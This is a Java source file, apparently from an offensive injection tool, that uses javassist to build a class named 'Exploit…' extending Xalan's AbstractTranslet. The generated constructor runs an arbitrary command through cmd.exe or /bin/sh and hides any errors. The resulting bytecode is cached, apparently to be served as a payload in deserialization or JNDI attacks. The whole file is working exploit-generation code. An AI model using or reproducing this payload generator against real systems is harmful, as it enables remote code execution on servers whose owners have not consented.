package net.roboterh.injector.templates;

import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtConstructor;
import net.roboterh.injector.utils.Cache;
import net.roboterh.injector.utils.PayloadUtils;
import org.apache.log4j.LogManager;
import org.apache.log4j.Logger;

public class CommandTemplate implements Template{
    private Logger logger = LogManager.getLogger(CommandTemplate.class);

    private String cmd;
    private byte[] bytes;
    private String className;

    public CommandTemplate(String cmd) {
        this.cmd = cmd;
        this.className = "Exploit" + PayloadUtils.getRandomString();

        // generate the bytes
        generate();
    }

    public CommandTemplate(String cmd, String className) {
        this.cmd = cmd;
        this.className = className;

        // generate the bytes
        generate();
    }


    @Override
    public String getClassName() {
        return className;
    }

    @Override
    public void addCache() {
        Cache.set(className, bytes);
    }

    @Override
    public void generate() {
        // generate bytecode using javassist
        try {
            ClassPool pool = ClassPool.getDefault();
            CtClass ctClass = pool.makeClass(className);
            // set the super class
            ctClass.setSuperclass(pool.get("com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet"));
            // set code of body
            CtConstructor ctConstructor = new CtConstructor(new CtClass[]{}, ctClass);
            ctConstructor.setBody("try{" +
                    "String os = System.getProperty(\"os.name\");"+
                    "if (os.toLowerCase().contains(\"win\")) {" +
                    "String[] cmds = new String[]{\"cmd.exe\", \"/c\", \"" + cmd + "\"};" +
                    "java.lang.Runtime.getRuntime().exec(cmds);" +
                    "} else {" +
                    "String[] cmds = new String[]{\"/bin/sh\", \"-c\", \"" + cmd + "\"};" +
                    "java.lang.Runtime.getRuntime().exec(cmds);" +
                    "}" +
                    "} catch (java.lang.Exception e) {" +
                    "}");
            ctClass.addConstructor(ctConstructor);

            // generate the codebyte
            bytes = ctClass.toBytecode();
        } catch (Exception e) {
            logger.info(e.getMessage());
        }
    }

    @Override
    public byte[] getBytes() {
        return bytes;
    }
}
